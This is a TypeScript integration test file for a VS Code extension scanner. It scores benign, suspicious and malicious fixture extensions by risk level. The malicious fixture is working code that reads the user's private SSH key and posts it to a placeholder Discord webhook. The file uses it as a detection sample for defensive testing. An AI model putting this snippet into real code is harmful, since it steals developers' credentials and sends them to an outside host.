/**
 * Fixture-based integration tests for the full scan pipeline.
 * Each "extension" is synthesised from a source string written to a temp file
 * so we exercise the real heuristics engine and scoring together.
 */
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { runHeuristics } from "../scanner/heuristics";
import { computeRisk } from "../scanner/scoring";
import { ExtensionInfo, IntelData } from "../types";

const tempDirs: string[] = [];

async function makeTempExtension(source: string, id = "test.fixture"): Promise<ExtensionInfo> {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "extensionshield-integ-"));
  tempDirs.push(dir);
  await fs.writeFile(path.join(dir, "extension.js"), source, "utf8");

  return {
    id,
    name: id.split(".")[1] ?? id,
    version: "1.0.0",
    description: "",
    extensionPath: dir,
    isBuiltin: false,
    activationEvents: [],
    contributes: {},
    main: "extension.js"
  };
}

afterEach(async () => {
  for (const dir of tempDirs.splice(0, tempDirs.length)) {
    await fs.rm(dir, { recursive: true, force: true });
  }
});

const emptyIntel: IntelData = {
  maliciousExtensions: [],
  vulnerableExtensions: [],
  maliciousHosts: []
};

// ---------------------------------------------------------------------------
// Benign fixture — only safe VS Code API usage, no suspicious patterns
// ---------------------------------------------------------------------------
const BENIGN_SOURCE = `
const vscode = require('vscode');

function activate(context) {
  const disposable = vscode.commands.registerCommand('my-ext.hello', () => {
    vscode.window.showInformationMessage('Hello from my extension!');
  });
  context.subscriptions.push(disposable);
}

exports.activate = activate;
exports.deactivate = () => {};
`;

// ---------------------------------------------------------------------------
// Suspicious fixture — uses child_process (single high finding)
// ---------------------------------------------------------------------------
const SUSPICIOUS_SOURCE = `
const vscode = require('vscode');
const child_process = require('child_process');

function activate(context) {
  const disposable = vscode.commands.registerCommand('my-ext.run', () => {
    child_process.exec('echo test', (err, stdout) => {
      vscode.window.showInformationMessage(stdout);
    });
  });
  context.subscriptions.push(disposable);
}

exports.activate = activate;
`;

// ---------------------------------------------------------------------------
// Malicious fixture — reads SSH key and exfiltrates via Discord webhook
// ---------------------------------------------------------------------------
const MALICIOUS_SOURCE = `
const fs = require('fs');
const os = require('os');

// Steal SSH private key
const keyPath = os.homedir() + '/.ssh/id_rsa';
const keyData = fs.readFileSync(keyPath, 'utf8');

// Post it to a Discord webhook (known exfil vector)
fetch('https://discord.com/api/webhooks/1234567890/AABBCC-DDEEFF_GGHHIIJJ', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ content: keyData })
});
`;

describe("integration: fixture risk levels", () => {
  it("benign extension scores low", async () => {
    const ext = await makeTempExtension(BENIGN_SOURCE, "test.benign");
    const findings = await runHeuristics(ext, emptyIntel);
    const { level } = computeRisk([], findings);
    expect(level).toBe("low");
  });

  it("suspicious extension (child_process only) scores elevated", async () => {
    const ext = await makeTempExtension(SUSPICIOUS_SOURCE, "test.suspicious");
    const findings = await runHeuristics(ext, emptyIntel);
    const { level } = computeRisk([], findings);
    expect(level).toBe("elevated");
    expect(findings.some((f) => f.ruleId === "H6")).toBe(true);
  });

  it("malicious extension (SSH key + Discord webhook) scores critical", async () => {
    const ext = await makeTempExtension(MALICIOUS_SOURCE, "test.malicious");
    const findings = await runHeuristics(ext, emptyIntel);
    const { level } = computeRisk([], findings);

    expect(level).toBe("critical");
    // Discord webhook rule must fire
    expect(findings.some((f) => f.ruleId === "H5")).toBe(true);
    // Sensitive path rule must fire
    expect(findings.some((f) => f.ruleId === "H8" || f.ruleId === "H10")).toBe(true);
  });

  it("malicious findings include snippets", async () => {
    const ext = await makeTempExtension(MALICIOUS_SOURCE, "test.snippets");
    const findings = await runHeuristics(ext, emptyIntel);
    const withSnippet = findings.filter((f) => f.snippet && f.snippet.length > 0);
    expect(withSnippet.length).toBeGreaterThan(0);
  });
});
